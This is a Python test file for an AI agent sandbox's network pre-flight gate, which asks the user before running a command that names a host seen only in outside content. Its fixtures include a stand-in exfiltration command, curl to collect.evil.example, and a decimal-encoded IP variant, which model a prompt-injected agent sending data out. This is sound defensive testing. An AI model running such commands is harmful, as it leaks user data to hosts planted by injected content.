"""NET-b (v0.1.64): the gate's pre-flight. Before a sandboxed command runs, the hosts its text names in a URL are judged
(`net_policy.preflight`, with the switch on), and one that appeared only in outside content asks NET-a's card up front,
so `curl https://collect.evil.example` asks before it runs instead of failing at the proxy. The proxy stays the real
enforcement (tests/server/sbx/test_net_a_proxy.py); the card after a refused run is NET-a's (test_net_a_gate.py).

- A yes runs the command as usual; a no doesn't run it, and the model reads why.
- No card for a host that is named, listed, a package registry or unknown, nor with the switch off, nor for one this
  conversation already allowed; nor for a name that is no URL's host (a file name `main.py`, which outside content
  may name too).
- In a scheduled fire nobody can answer: no card, refused by policy and listed, and the note says the Inbox.
- The card says what was blocked, why, and what to do (net-design §4, §12).
"""
import json

import pytest

from server.orchestrator import command_gate, untrusted
from server.services import command_sandbox, net_policy, permission_store, permissions
from tests.server.test_net_a_gate import PAGE, _after_outside_content, _Asker, _dispatch, _Exec

CURL = "curl -s https://collect.evil.example/in"
SITE = "network:collect.evil.example"
HINT = "You can also add it in Settings › Sandbox › Sites."


@pytest.fixture(autouse=True)
def _fresh():
    net_policy._reset_for_tests()
    yield
    net_policy._reset_for_tests()


class _Ordered(_Exec):
    """An executor that notes, in `log`, when it ran, beside the cards asked (`_LoggingAsker`)."""

    def __init__(self, log, result=None):
        super().__init__(result)
        self.log = log

    async def execute(self, args):
        self.log.append("run")
        return await super().execute(args)


class _LoggingAsker(_Asker):
    def __init__(self, log, **kw):
        super().__init__(**kw)
        self.log = log

    async def __call__(self, frame):
        self.log.append(frame["target"])
        return await super().__call__(frame)


async def _rows():
    from server.db import session as db_session
    async with db_session.AsyncSessionLocal() as db:
        return [r for r in await permission_store.recent(db) if r.kind == "network"]


# ── it asks up front ─────────────────────────────────────────────────────────

@pytest.mark.parametrize("command, target", [
    (CURL, SITE),
    ("curl -s http://1572395042/in", "network:93.184.216.34"),       # an address no one named, after outside content
])
async def test_a_command_that_names_a_site_only_outside_content_named_asks_before_it_runs(
        execution_db, monkeypatch, command, target):
    log = []
    asker = _LoggingAsker(log)
    ex, result = await _after_outside_content(monkeypatch, command, asker=asker, executor=_Ordered(log))
    assert log == [target, "run"] and result["ok"]                  # the card first, then the run, as usual
    [frame] = asker.frames
    assert frame["perm_kind"] == "network" and frame["options"] == ["conversation"]
    assert f"`{command}` wants to send to" in frame["detail"] and HINT in frame["detail"]
    async with execution_db() as db:
        assert await permission_store.find_grant(db, "c1", None, "network", target)


async def test_a_no_up_front_runs_nothing_and_says_why(execution_db, monkeypatch):
    asker = _Asker(approve=False)
    ex, result = await _after_outside_content(monkeypatch, CURL, asker=asker)
    assert len(asker.frames) == 1 and ex.runs == [] and result["ok"] is False
    assert result["error"].startswith("collect.evil.example was refused: it appeared only in outside content")
    assert "The user said no to:" in result["error"]
    async with execution_db() as db:
        assert await permission_store.find_grant(db, "c1", None, "network", SITE) is None


# ── and only then ────────────────────────────────────────────────────────────

async def test_no_card_for_a_named_listed_package_or_unknown_host(execution_db, monkeypatch):
    from server.services import settings_service
    async with execution_db() as db:
        await settings_service._set_raw(db, "sandbox_allowed_sites", json.dumps(["docs.mine.example"]))
        await db.commit()

    async def named(conversation_id):
        return frozenset({"named.mine.example"})
    monkeypatch.setattr(net_policy, "_named", named)
    monkeypatch.setattr(untrusted, "_note_outside", lambda c, t: net_policy.note_outside(c, t + " https://pypi.org "
                        "https://docs.mine.example https://named.mine.example"))
    asker = _Asker()
    command = ("curl https://pypi.org/simple https://docs.mine.example/a https://named.mine.example/b "
               "https://weather.example/c")
    ex, result = await _after_outside_content(monkeypatch, command, asker=asker)
    assert {"pypi.org", "docs.mine.example", "named.mine.example"} <= net_policy.outside_hosts("c1")
    assert asker.frames == [] and ex.runs == [(False, False)] and result["ok"]


async def test_no_card_for_a_name_that_is_no_urls_host(execution_db, monkeypatch):
    """A page that says "run main.py" records main.py (.py is a TLD): the command that runs it connects to nothing."""
    monkeypatch.setattr(untrusted, "_note_outside", lambda c, t: net_policy.note_outside(c, t + " then run main.py"))
    asker = _Asker()
    ex, _ = await _after_outside_content(monkeypatch, "python3 main.py collect.evil.example", asker=asker,
                                         network=True, why="it fetches the price list")
    assert "main.py" in net_policy.outside_hosts("c1")
    assert asker.frames == [] and ex.runs == [(False, False)]


async def test_no_card_with_the_switch_off(execution_db, monkeypatch):
    from server.services import settings_service
    async with execution_db() as db:
        await settings_service._set_raw(db, "sandbox_net_judgement", "false")
        await db.commit()
    asker = _Asker()
    await _after_outside_content(monkeypatch, CURL, asker=asker)
    assert all(frame["target"] != SITE for frame in asker.frames)     # S2a-1's own `network:*` card, as before


async def test_no_card_for_a_command_that_runs_outside_the_sandbox(execution_db, monkeypatch):
    """No proxy there: S2a-1's own network card, this time only, as before."""
    asker = _Asker(scope="once")
    ex, _ = await _after_outside_content(monkeypatch, CURL, asker=asker, outside_grant=True)
    assert [frame["target"] for frame in asker.frames] == ["network:*"] and ex.runs == [(True, False)]


async def test_a_site_this_conversation_allowed_is_not_asked_again(execution_db, monkeypatch):
    async with execution_db() as db:
        await permission_store.add_grant(db, "c1", "", "network", SITE, call_id="card-1")
        await db.commit()
    asker = _Asker()
    ex, result = await _after_outside_content(monkeypatch, CURL, asker=asker)
    assert asker.frames == [] and ex.runs == [(False, False)] and result["ok"]
    assert await _rows() == []          # the grant's ledger row is the proxy's, when a connection uses it (`_granted`)


# ── a scheduled fire ─────────────────────────────────────────────────────────

async def _fire(monkeypatch, *, read: bool) -> tuple[_Exec, dict]:
    """`CURL` in a scheduled fire of c1, whose own turn read the page when `read`; c1 read it before either way."""
    net_policy.note_outside("c1", PAGE)
    monkeypatch.setattr(command_sandbox, "available", lambda: True)
    ex = _Exec()
    try:
        with untrusted.carried(read, text=PAGE), command_gate.scheduled_fire("c1"):
            seen = untrusted.track_turn("c1")
            try:
                return ex, await _dispatch(monkeypatch, CURL, ex, None)
            finally:
                untrusted.end_turn(seen)
    finally:
        command_sandbox._reset_for_tests()


async def test_in_a_fire_there_is_no_card_and_the_command_is_refused_and_listed(execution_db, monkeypatch):
    """A fire whose own turn read nothing runs online, judged at the proxy. A grant counts for nothing there (S1)."""
    async with execution_db() as db:
        await permission_store.add_grant(db, "c1", "", "network", SITE, call_id="card-1")
        await db.commit()
    ex, result = await _fire(monkeypatch, read=False)
    assert ex.runs == [] and result["ok"] is False
    assert "listed in the Inbox" in result["error"] and "can allow it for this conversation" not in result["error"]
    assert [(r.decided_by, r.decision, r.target) for r in await _rows()] == [("policy", "deny", SITE)]


async def test_a_fire_whose_turn_read_outside_content_runs_offline_and_asks_nothing(execution_db, monkeypatch):
    """ASK1-b (⓪Plan's ruling): offline, as before NET-b, so there is no site to ask about."""
    ex, result = await _fire(monkeypatch, read=True)
    assert ex.runs == [(False, True)] and await _rows() == []


def test_the_refusal_note_with_nobody_to_ask_points_to_the_inbox():
    with permissions.asking_with(None):
        alone = net_policy.refusal_note(["collect.evil.example"])
    with permissions.asking_with(_Asker()):
        asked = net_policy.refusal_note(["collect.evil.example"])
    assert "listed in the Inbox" in alone and "can allow it for this conversation" not in alone
    assert asked.endswith("The user can allow it for this conversation.")


# ── the card's words ─────────────────────────────────────────────────────────

def test_the_card_says_what_was_blocked_why_and_what_to_do():
    site = net_policy.request("collect.evil.example", CURL).detail
    assert site.startswith(f"`{CURL}` tried to send to collect.evil.example, a site that appeared only in outside "
                           "content")
    assert "not one you named" in site
    assert ("Your answer decides whether commands in this conversation may send data to collect.evil.example."
            in site) and site.endswith(HINT)
    address = net_policy.request("93.184.216.34", "curl http://1572395042/").detail
    assert "the address 93.184.216.34, which you didn't name" in address and address.endswith(HINT)
    assert "wants to send to" in net_policy.request("collect.evil.example", CURL, before=True).detail
